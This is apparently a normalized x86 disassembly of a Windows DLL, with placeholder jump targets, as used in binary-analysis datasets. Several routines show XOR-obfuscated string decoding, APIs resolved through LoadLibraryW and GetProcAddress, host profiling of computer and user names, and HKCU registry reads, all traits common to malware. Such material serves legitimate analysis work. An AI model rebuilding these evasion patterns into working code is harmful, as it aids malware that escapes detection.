mov eax [ esi ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub edi eax
sar edi 0x1
push edi
push esi
mov ecx esi
call sub_1004b542
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push ebx
lea ebx [ edi + edi ]
push ebx
push [ ebp + 0x8 ]
push eax
call sub_10078600
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
xor ecx ecx
mov [ ebx + eax ] cx
pop ebx
sub_10013180
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x18
push esi
mov esi [ ecx + 0x3a0 ]
mov ecx [ ecx + 0x3a4 ]
xor eax eax
push edi
cmp esi ecx
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov edi [ esi ]
cmp edx [ edi ]
je r-xdata
mov eax edi
mov ecx [ eax + 0x30 ]
mov edx [ ecx + 0x4 ]
test [ eax + edx + 0x3c ] 0x6
jne r-xdata
add esi 0x4
cmp esi ecx
jne r-xdata
mov ecx [ r--data ]
mov eax [ r--data ]
mov [ esp + 0xc ] ecx
xor ecx ecx
mov [ esp + 0x14 ] ecx
mov ecx [ eax + edx + 0x68 ]
mov eax [ ecx ]
mov eax [ eax + 0x28 ]
push 0x2
push 0x1
push 0x0
push 0x0
lea edx [ esp + 0x18 ]
push edx
call eax
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov ecx [ r--data ]
mov eax [ r--data ]
mov [ esp + 0xc ] ecx
xor ecx ecx
sub eax edi
mov [ esp + 0x14 ] ecx
add eax ecx
mov eax [ eax + esi + 0x68 ]
mov edx [ eax ]
mov edx [ edx + 0x28 ]
push 0x2
push 0x1
push 0x0
push 0x0
lea ecx [ esp + 0x18 ]
push ecx
mov ecx eax
call edx
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
sub eax edi
add eax ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp + 0xc ]
push 0x0
lea edi [ eax + ecx ]
mov eax [ ebp + 0x8 ]
mov ecx [ esi ]
push edx
push eax
add ecx 0x30
push ecx
call sub_1004b8f0
mov esi [ esi ]
mov edx [ esi + 0x30 ]
mov eax [ edx + 0x4 ]
test [ eax + esi + 0x3c ] 0x6
jne r-xdata
sub_10013280
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10009180
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov edi [ rw-data ]
mov [ ebp - 0x24 ] edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi 0x104
push esi
lea eax [ edi + 0x124 ]
push eax
push ebx
call [ GetModuleFileNameW@IAT ]
mov [ ebp - 0x1c ] esi
lea ecx [ ebp - 0x1c ]
push ecx
lea edx [ edi + 0x73c ]
push edx
call [ GetComputerNameW@IAT ]
mov [ ebp - 0x20 ] ebx
mov eax [ edi + 0x8 ]
cmp eax 0x6
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ IsWow64Process@IAT ]
cmp eax 0x5
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x20 ]
mov [ edi + 0xd54 ] ecx
mov [ ebp - 0x1c ] esi
lea edx [ ebp - 0x1c ]
push edx
lea eax [ edi + 0x944 ]
push eax
call [ GetUserNameW@IAT ]
call sub_10027030
mov [ edi + 0xd58 ] eax
lea ecx [ edi + 0xb4c ]
call sub_1004b3c0
lea ecx [ edi + 0xd7c ]
push ecx
mov ecx edi
call sub_100073c0
lea ecx [ edi + 0xd5c ]
call sub_1000c2f0
mov [ edi + 0xdc4 ] 0x1
jmp r-xdata
cmp [ edi + 0xc ] 0x1
jbe r-xdata
sub_100133a0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0x10 ]
push edi
push eax
push ecx
call sub_10055977
mov esi eax
add esp 0xc
cmp esi edi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x10
call sub_10012991
mov edx [ eax ]
mov eax [ ebp + 0x14 ]
mov [ eax ] edx
mov eax esi
sub_100133e0
push ebp
mov ebp esp
push 0xffffffff
push sub_10081d12
mov eax [ fs : 0x0 ]
push eax
sub esp 0x134
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x13c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x140 ] ecx
mov ecx [ r--data ]
mov [ ebp - 0x138 ] eax
movsx eax [ ecx ]
xor eax 0x57
xor ecx ecx
and eax 0xff
mov [ ebp - 0x12c ] ax
mov [ ebp - 0x12a ] cx
mov ecx [ r--data ]
xor edi edi
xor eax eax
movsx esi [ ecx + eax ]
xor esi eax
xor esi 0xff97
and esi 0xff
mov [ ebp + eax * 2 - 0x20 ] si
inc eax
cmp eax 0x2
jb r-xdata
xor eax eax
mov [ ebp - 0x1c ] ax
xor ecx ecx
mov eax edx
mov [ ebp - 0x88 ] 0x7
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x9c ] cx
lea esi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push edx
lea ecx [ ebp - 0x9c ]
call sub_1005e3c0
lea edx [ ebp - 0x9c ]
push edx
lea edx [ ebp - 0x12c ]
lea esi [ ebp - 0xf0 ]
mov [ ebp - 0x4 ] edi
call sub_10036350
add esp 0x4
push eax
lea edx [ ebp - 0x20 ]
lea esi [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x1
call sub_10045750
add esp 0x4
mov ebx 0x8
cmp [ ebp - 0xdc ] ebx
jb r-xdata
mov esi 0x7
xor ecx ecx
mov [ ebp - 0xdc ] esi
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xf0 ] cx
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x88 ] ebx
jb r-xdata
mov eax [ ebp - 0xf0 ]
push eax
call sub_10065045
add esp 0x4
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x9c ] ax
mov edi edi
mov edx [ ebp - 0x9c ]
push edx
call sub_10065045
add esp 0x4
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x61
and edx 0xff
mov [ ebp + eax * 2 - 0x80 ] dx
inc eax
cmp eax 0x2c
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x28 ] ax
jmp r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xff99
and edx 0xff
mov [ ebp + eax * 2 - 0x18 ] dx
inc eax
cmp eax 0x2
jb r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
lea edx [ ebp - 0x13c ]
xor eax eax
push edx
lea edx [ ebp - 0x80 ]
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x14 ] ax
call sub_10005160
mov eax [ r--data ]
movsx ecx [ eax ]
mov eax [ r--data ]
xor ecx 0xffad
and ecx 0xff
xor edx edx
mov [ ebp - 0x130 ] cx
mov [ ebp - 0x12e ] dx
movsx ecx [ eax ]
xor ecx 0x2e
and ecx 0xff
add esp 0x8
xor eax eax
mov [ ebp - 0xc0 ] esi
mov esi [ ebp - 0x140 ]
mov [ ebp - 0xd4 ] ax
mov eax esi
mov [ ebp - 0x132 ] dx
mov [ ebp - 0x134 ] cx
mov [ ebp - 0xc4 ] edi
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0xd4 ]
call sub_1005e3c0
lea ecx [ ebp - 0xd4 ]
push ecx
lea edx [ ebp - 0x130 ]
lea esi [ ebp - 0x128 ]
mov [ ebp - 0x4 ] 0x5
call sub_10036350
add esp 0x4
push eax
lea edx [ ebp - 0x134 ]
lea esi [ ebp - 0x10c ]
mov [ ebp - 0x4 ] 0x6
call sub_10045750
add esp 0x4
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x7
call sub_1000c1e0
cmp [ ebp - 0xf8 ] ebx
jb r-xdata
xor eax eax
mov esi 0x7
mov [ ebp - 0xf8 ] esi
mov [ ebp - 0xfc ] edi
mov [ ebp - 0x10c ] ax
cmp [ ebp - 0x114 ] ebx
jb r-xdata
mov edx [ ebp - 0x10c ]
push edx
call sub_10065045
add esp 0x4
xor edx edx
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x118 ] edi
mov [ ebp - 0x128 ] dx
cmp [ ebp - 0xc0 ] ebx
jb r-xdata
mov ecx [ ebp - 0x128 ]
push ecx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0xb8 ]
cmp [ ebp - 0xa4 ] ebx
jae r-xdata
mov eax [ ebp - 0xd4 ]
push eax
call sub_10065045
add esp 0x4
mov edx [ ebp - 0x138 ]
push edx
call sub_100153b0
add esp 0x4
mov esi eax
cmp [ ebp - 0xa4 ] ebx
jb r-xdata
lea ecx [ ebp - 0xb8 ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xb8 ]
push eax
call sub_10065045
add esp 0x4
sub_10013757
push 0x28
mov eax sub_1007e4e0
call sub_10050d0f
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_100137e1
push 0x28
mov eax sub_1007e4e0
call sub_10050d0f
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x2
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10013870
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff84
and edx 0xff
mov [ ebp + eax * 2 - 0x10 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x34
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0x7
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x12 ] ax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffd6
and edx 0xff
mov [ ebp + eax * 2 - 0x30 ] dx
inc eax
cmp eax 0x6
jb r-xdata
push ebx
push esi
mov esi [ lstrlenW@IAT ]
push edi
lea ecx [ ebp - 0x30 ]
xor eax eax
push ecx
mov [ ebp - 0x24 ] ax
call esi
lea edx [ ebp - 0x20 ]
push edx
mov edi eax
call esi
add edi eax
lea eax [ ebp - 0x10 ]
push eax
call esi
add eax edi
lea ecx [ eax + eax + 0x6 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
call esi
add eax eax
push eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_10078600
add esp 0xc
lea ecx [ ebp - 0x10 ]
push ecx
call esi
push r--data
mov edi eax
call esi
add eax eax
push eax
lea edx [ ebx + edi * 2 ]
push r--data
push edx
call sub_10078600
add esp 0xc
push r--data
call esi
add edi eax
lea eax [ ebp - 0x20 ]
push eax
call esi
add eax eax
push eax
lea ecx [ ebp - 0x20 ]
push ecx
lea edx [ ebx + edi * 2 ]
push edx
call sub_10078600
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
call esi
push r--data
add edi eax
call esi
add eax eax
push eax
lea ecx [ ebx + edi * 2 ]
push r--data
push ecx
call sub_10078600
add esp 0xc
push r--data
call esi
lea edx [ ebp - 0x30 ]
push edx
add edi eax
call esi
add eax eax
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebx + edi * 2 ]
push ecx
call sub_10078600
mov ecx [ ebp - 0x4 ]
add esp 0xc
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10013a0b
push 0x4
mov eax sub_1007e5c5
call sub_10050d0f
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
call sub_1006101a
mov eax esi
call sub_1001a1b3
retn 0x8
sub_10013a40
push ebp
mov ebp esp
sub esp 0x214
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x214 ] eax
call [ GetCurrentThreadId@IAT ]
cmp [ esi + 0x374 ] eax
je r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0xc ] ebx
je r-xdata
lea edx [ ebp - 0x10c ]
mov eax 0xdb
call sub_1001bb80
xor eax eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x8
push edi
cmp [ esi + 0x384 ] ebx
jne r-xdata
lea edx [ ebp - 0xf8 ]
lea eax [ ebx + 0x2a ]
call sub_1001bb80
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x8
push 0x104
mov eax 0x1
lea edx [ ebp - 0x210 ]
push ebx
push edx
mov [ esi + 0x3c ] ebx
mov [ esi + 0x44 ] eax
mov [ esi + 0x48 ] eax
mov [ esi + 0x40 ] eax
call sub_10078970
add esp 0xc
lea eax [ ebp - 0x210 ]
push eax
push 0x104
call [ GetCurrentDirectoryA@IAT ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x214 ]
push ecx
push edx
lea eax [ ebp - 0x210 ]
push eax
lea edi [ esi + 0x50 ]
push esi
mov ebx edi
call sub_1005dd20
test eax eax
je r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0x40
call sub_1001bb80
lea edi [ ebp - 0x10 ]
mov eax 0xd3
call sub_10057840
lea edi [ ebp - 0x28 ]
mov eax 0xc2
call sub_10057840
lea edi [ ebp - 0x38 ]
mov eax 0x93
call sub_10057840
lea edi [ ebp - 0x48 ]
mov eax 0xbb
call sub_10057840
lea edi [ ebp - 0x1c ]
mov eax 0x121
call sub_10057840
lea ecx [ ebp - 0x60 ]
push ecx
call [ LoadLibraryW@IAT ]
mov edi [ GetProcAddress@IAT ]
lea edx [ ebp - 0x10 ]
push edx
push eax
mov [ esi + 0x384 ] eax
call edi
mov ecx [ esi + 0x384 ]
mov [ esi + 0x388 ] eax
lea eax [ ebp - 0x28 ]
push eax
push ecx
call edi
lea edx [ ebp - 0x38 ]
mov [ esi + 0x38c ] eax
mov eax [ esi + 0x384 ]
push edx
push eax
call edi
mov edx [ esi + 0x384 ]
lea ecx [ ebp - 0x48 ]
push ecx
push edx
mov [ esi + 0x390 ] eax
call edi
mov ecx [ esi + 0x384 ]
mov [ esi + 0x394 ] eax
lea eax [ ebp - 0x1c ]
push eax
push ecx
call edi
mov [ esi + 0x398 ] eax
cmp [ esi + 0x388 ] ebx
je r-xdata
pop edi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x8
push esi
push edi
mov edx [ esi + 0x388 ]
push sub_1004c990
push sub_10027780
push sub_100113f0
push sub_10024730
push sub_10030040
push sub_10021180
push sub_10041050
push sub_1001bb70
push sub_1003cda0
lea ecx [ esi + 0x10 ]
push sub_1001a1b0
push ecx
call edx
xor ecx ecx
add esp 0x34
test eax eax
setne cl
mov [ esi + 0xc ] eax
pop edi
pop ebx
mov eax ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x8
lea edx [ ebp - 0xac ]
mov eax 0x68
mov [ esi + 0x384 ] ebx
call sub_1001bb80
cmp [ esi + 0x38c ] ebx
je r-xdata
cmp [ esi + 0x390 ] ebx
je r-xdata
cmp [ esi + 0x394 ] ebx
je r-xdata
cmp eax ebx
jne r-xdata
sub_10013c90
push ebp
mov ebp esp
sub esp 0xf0c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ ebp - 0xf0c ] eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push ebx
push edi
lea edx [ ebp - 0xc4 ]
mov eax 0x7
call sub_1001a720
lea edx [ ebp - 0x10 ]
mov eax 0x1
call sub_1001a720
lea edx [ ebp - 0x48 ]
mov eax 0x5
call sub_1001a720
mov eax edx
push eax
lea ecx [ ebp - 0xc4 ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
mov ecx 0x104
lea ebx [ ebp - 0x8e4 ]
call sub_100254a0
add esp 0xc
lea eax [ ebp - 0xf00 ]
push eax
push 0x20119
push 0x0
mov ecx ebx
mov ebx [ RegOpenKeyExW@IAT ]
push ecx
push 0x80000001
call ebx
test eax eax
jne r-xdata
pop edi
pop ebx
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xf00 ]
lea edx [ ebp - 0xf04 ]
push edx
lea eax [ ebp - 0xefc ]
push eax
push 0x0
push 0x0
push 0x0
push ecx
mov [ ebp - 0xf04 ] 0x618
call [ RegQueryValueExW@IAT ]
mov edi eax
test edi edi
je r-xdata
mov edx [ ebp - 0xf00 ]
push edx
call [ RegCloseKey@IAT ]
test edi edi
jne r-xdata
mov edi 0x2
lea eax [ ebp - 0xefc ]
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x28 ]
lea eax [ edi + 0x4 ]
call sub_1001a720
lea ecx [ ebp - 0xf04 ]
push ecx
push 0x20119
push edi
lea edx [ ebp - 0xc4 ]
push edx
push 0x80000001
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0xefc ]
push eax
lea ecx [ ebp - 0x28 ]
push ecx
lea edi [ ebp - 0xf04 ]
mov eax 0x30c
call sub_10027e90
add esp 0x8
test eax eax
jne r-xdata
lea edx [ ebp - 0xf04 ]
mov eax 0x3
call sub_1001a720
lea edx [ ebp - 0xf00 ]
mov eax 0x6
call sub_1001a720
lea edx [ ebp - 0xf08 ]
mov eax 0x2
call sub_1001a720
push edx
push esi
call [ StrStrW@IAT ]
xor edi edi
lea ecx [ ebp - 0x6dc ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
sub esi ecx
lea ebx [ ebp - 0xf00 ]
sub ebx ecx
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
jne r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
jne r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0xf08 ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x6dc ]
call sub_10030af0
test eax eax
jne r-xdata
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
push esi
mov esi 0x30c
lea ebx [ ebp - 0x6dc ]
call sub_10030af0
test eax eax
jne r-xdata
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
mov edi [ ebp - 0xf0c ]
lea ecx [ ebp - 0xf08 ]
push ecx
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0xf00 ]
push eax
call sub_10030af0
test eax eax
je r-xdata
push edi
mov esi 0x30c
lea ebx [ ebp - 0x6dc ]
call sub_10030af0
test eax eax
jne r-xdata
lea edx [ ebp - 0xf00 ]
push edx
call sub_10030af0
test eax eax
jne r-xdata
lea eax [ ebp - 0xf08 ]
push eax
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0xf04 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x6dc ]
call sub_10030af0
test eax eax
jne r-xdata
lea ecx [ ebp - 0xf00 ]
push ecx
call sub_10030af0
test eax eax
jne r-xdata
lea eax [ ebp - 0xf08 ]
push eax
call sub_10030af0
test eax eax
jne r-xdata
mov ecx [ ebp + 0xc ]
push ecx
call sub_10030af0
test eax eax
jne r-xdata
mov edx ebx
push edx
lea eax [ ebp - 0xefc ]
push eax
call [ lstrcmpiW@IAT ]
neg eax
pop edi
sbb eax eax
pop ebx
inc eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10013ff0
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0x24
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_1001c310
mov eax esi
mov esp ebp
pop ebp
retn
sub_1001401c
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_1003c242
and [ eax ] 0x0
call sub_10012991
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_1003c242
mov [ eax ] ebx
call sub_10012991
mov [ eax ] 0x9
call sub_1002788e
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
mov cl [ eax + esi + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_1003c242
mov [ eax ] ebx
call sub_10012991
mov [ eax ] 0x9
jmp r-xdata
call sub_1003c242
mov [ eax ] ebx
call sub_10012991
mov [ eax ] 0x16
mov [ ebp - 0xc ] ebx
cmp edx ebx
je r-xdata
call sub_1002788e
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + esi + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_10028397
mov ebx eax
pop ecx
mov [ ebp - 0x10 ] ebx
test ebx ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
mov eax ebx
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_1005905c
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_10012991
mov [ eax ] 0xc
call sub_1003c242
mov [ eax ] 0x8
push 0x0
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
test ecx ecx
js r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_10012991
mov [ eax ] 0x9
call sub_1003c242
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x0
mov [ ebx ] cl
mov ecx [ edi ]
lea eax [ ebx + 0x1 ]
mov [ ebp - 0xc ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
je r-xdata
push eax
call sub_100249b4
pop ecx
and [ ebp - 0x14 ] 0x0
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0xc ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_10020a90
pop ecx
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp ecx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp ecx 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
